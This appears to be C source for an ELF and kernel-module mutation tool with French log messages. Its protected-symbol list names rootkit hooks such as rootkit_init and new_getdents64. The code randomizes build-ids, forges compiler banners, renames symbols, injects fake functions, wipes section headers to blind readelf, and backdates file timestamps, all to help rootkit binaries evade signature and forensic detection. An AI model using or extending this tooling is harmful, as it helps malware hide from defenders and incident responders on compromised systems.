#define _POSIX_C_SOURCE 200809L
#include "transforms.h"
#include "rand_utils.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <unistd.h>


int transform_build_id(elf_ctx_t *ctx)
{
    Elf64_Shdr *sec = elf_find_section(ctx, ".note.gnu.build-id");
    if (!sec) {
        fprintf(stderr, "  [-] .note.gnu.build-id: not found\n");
        return -1;
    }

    uint8_t *note = ctx->buf + sec->sh_offset;

    uint32_t namesz = *(uint32_t *)(note + 0);
    uint32_t descsz = *(uint32_t *)(note + 4);

    uint32_t name_padded = (namesz + 3) & ~3u;
    uint32_t desc_off    = 12 + name_padded;

    if (desc_off + descsz > sec->sh_size) {
        fprintf(stderr, "  [!] .note.gnu.build-id: layout incohérent\n");
        return -1;
    }

    rand_bytes(note + desc_off, descsz);

    printf("  [+] build-id → ");
    for (uint32_t i = 0; i < descsz; i++)
        printf("%02x", note[desc_off + i]);
    printf("\n");

    return 0;
}


int transform_bss_pad(elf_ctx_t *ctx)
{
    Elf64_Shdr *sec = elf_find_section(ctx, ".bss");
    if (!sec) {
        fprintf(stderr, "  [-] .bss: not found\n");
        return -1;
    }
    uint64_t delta = rand_range(16, 512);
    sec->sh_size += delta;

    printf("  [+] .bss pad  +%lu bytes (total %lu)\n",
           (unsigned long)delta, (unsigned long)sec->sh_size);
    return 0;
}

int transform_comment(elf_ctx_t *ctx)
{
    Elf64_Shdr *sec = elf_find_section(ctx, ".comment");
    if (!sec) {
        fprintf(stderr, "  [-] .comment: not found\n");
        return -1;
    }

    char salt[9];
    rand_hex_str(salt, 8);
    uint32_t major = rand_range(9, 14);
    uint32_t minor = rand_range(0, 4);
    uint32_t patch = rand_range(0, 3);
    char banner[64];
    int  blen = snprintf(banner, sizeof(banner),
                         "GCC: (GNU) %u.%u.%u Build/%s",
                         major, minor, patch, salt);
    uint8_t *data = ctx->buf + sec->sh_offset;
    memset(data, 0, sec->sh_size);
    size_t write_len = (size_t)blen < sec->sh_size ? (size_t)blen : sec->sh_size - 1;
    memcpy(data, banner, write_len);
    return 0;
}

int transform_strip(const char *src, const char *dst, int is_ko)
{
    const char *flag = is_ko ? "--strip-debug" : "--strip-all";
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        return -1;
    }
    if (pid == 0) {
        execlp("objcopy", "objcopy", flag, src, dst, NULL);
        perror("execlp objcopy");
        _exit(1);
    }

    int status;
    waitpid(pid, &status, 0);
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        fprintf(stderr, "  [!] objcopy échoué (code %d)\n", WEXITSTATUS(status));
        return -1;
    }
    printf("  [+] strip     → %s  (%s)\n", dst, flag);
    return 0;
}

static const char *ko_protected[] = {
    "init_module",
    "cleanup_module",
    "rootkit_init",
    "rootkit_exit",
    "new_read",
    "new_getdents64",
    "install_hook",
    "uninstall_hook",
    "install_read_hook",
    "uninstall_read_hook",
    NULL
};

static int is_protected(const char *name, int is_ko)
{
    if (!name || name[0] == '\0')
        return 1;

    if (name[0] == '$' || name[0] == '.')
        return 1;

    if (!is_ko)
        return 0;

    for (int i = 0; ko_protected[i]; i++) {
        if (strcmp(name, ko_protected[i]) == 0)
            return 1;
    }
    return 0;
}

int transform_rename_symbols(elf_ctx_t *ctx, int is_ko)
{
    Elf64_Shdr *symtab_sec = elf_find_section(ctx, ".symtab");
    Elf64_Shdr *strtab_sec = elf_find_section(ctx, ".strtab");

    if (!symtab_sec || !strtab_sec) {
        fprintf(stderr, "  [-] .symtab/.strtab: non trouvées (déjà strippé ?)\n");
        return -1;
    }

    Elf64_Sym *syms     = (Elf64_Sym *)(ctx->buf + symtab_sec->sh_offset);
    char      *strtab   = (char *)(ctx->buf + strtab_sec->sh_offset);
    int        n_syms   = (int)(symtab_sec->sh_size / sizeof(Elf64_Sym));
    int        renamed  = 0;

    for (int i = 0; i < n_syms; i++) {
        Elf64_Sym *sym = &syms[i];

        uint8_t type    = ELF64_ST_TYPE(sym->st_info);
        uint8_t binding = ELF64_ST_BIND(sym->st_info);

        /* On cible uniquement les fonctions locales */
        if (type != STT_FUNC || binding != STB_LOCAL)
            continue;

        char *name = strtab + sym->st_name;

        if (is_protected(name, is_ko))
            continue;

        size_t name_len = strlen(name);
        if (name_len < 3)
            continue;

        char new_name[64];
        size_t hex_len = name_len - 2;
        if (hex_len > 60) hex_len = 60;
        if (hex_len < 1)  hex_len = 1;

        new_name[0] = '_';
        new_name[1] = 'f';
        rand_hex_str(new_name + 2, hex_len);

        memset(name, 0, name_len);
        memcpy(name, new_name, strlen(new_name));

        renamed++;
    }

    printf("  [+] rename    → %d symboles locaux renommés\n", renamed);
    return 0;
}

#define FAKE_FUNC_SIZE 11

static void gen_fake_func(uint8_t *out)
{
    out[0]  = 0x55;
    out[1]  = 0x48;
    out[2]  = 0x89;
    out[3]  = 0xE5;
    out[4]  = 0xB8;
    rand_bytes(out + 5, 4);
    out[9]  = 0x5D;
    out[10] = 0xC3; 
}

int transform_dead_code(elf_ctx_t *ctx)
{
    Elf64_Shdr *text = elf_find_section(ctx, ".text");
    if (!text) {
        fprintf(stderr, "  [-] .text: non trouvée\n");
        return -1;
    }

    uint64_t text_end = text->sh_offset + text->sh_size;
    for (int i = 0; i < ctx->ehdr->e_shnum; i++) {
        Elf64_Shdr *s = &ctx->shdrs[i];
        if (s->sh_type == SHT_NOBITS)
            continue;
        if (s->sh_offset + s->sh_size > text_end + 1) {
            fprintf(stderr, "  [!] dead_code: .text n'est pas la dernière section, skip\n");
            return -1;
        }
    }

    int n_funcs   = (int)rand_range(3, 8);
    size_t inject = (size_t)n_funcs * FAKE_FUNC_SIZE;

    uint8_t *new_buf = realloc(ctx->buf, ctx->size + inject);
    if (!new_buf) {
        perror("  [!] realloc");
        return -1;
    }
    ctx->buf  = new_buf;

    ctx->ehdr     = (Elf64_Ehdr *)ctx->buf;
    ctx->shdrs    = (Elf64_Shdr *)(ctx->buf + ctx->ehdr->e_shoff);
    ctx->shstrtab = (ctx->ehdr->e_shstrndx != SHN_UNDEF)
                  ? (const char *)(ctx->buf + ctx->shdrs[ctx->ehdr->e_shstrndx].sh_offset)
                  : NULL;

    text = elf_find_section(ctx, ".text");

    uint8_t *dst = ctx->buf + text->sh_offset + text->sh_size;
    for (int i = 0; i < n_funcs; i++)
        gen_fake_func(dst + i * FAKE_FUNC_SIZE);

    text->sh_size += inject;
    ctx->size     += inject;

    printf("  [+] dead code → %d fausses fonctions (%zu bytes)\n", n_funcs, inject);
    return 0;
}

int transform_nuke_section_headers(elf_ctx_t *ctx)
{
    ctx->ehdr->e_shnum    = 0;
    ctx->ehdr->e_shstrndx = 0;
    ctx->ehdr->e_shoff    = 0;
    ctx->shdrs    = NULL;
    ctx->shstrtab = NULL;
    printf("  [+] nuke shdrs → e_shnum=0 e_shoff=0 (readelf aveugle)\n");
    return 0;
}

int transform_forge_timestamps(const char *path)
{
    time_t now        = time(NULL);
    uint32_t offset   = rand_range(6 * 30 * 86400, 18 * 30 * 86400);
    time_t forged     = now - (time_t)offset;

    struct timespec times[2];
    times[0].tv_sec  = forged;
    times[0].tv_nsec = 0;
    times[1].tv_sec  = forged;
    times[1].tv_nsec = 0;
    if (utimensat(AT_FDCWD, path, times, 0) < 0) {
        perror("  [!] utimensat");
        return -1;
    }
    struct tm *t = localtime(&forged);
    char buf[32];
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M", t);
    printf("  [+] timestamp  → %s\n", buf);
    return 0;
}
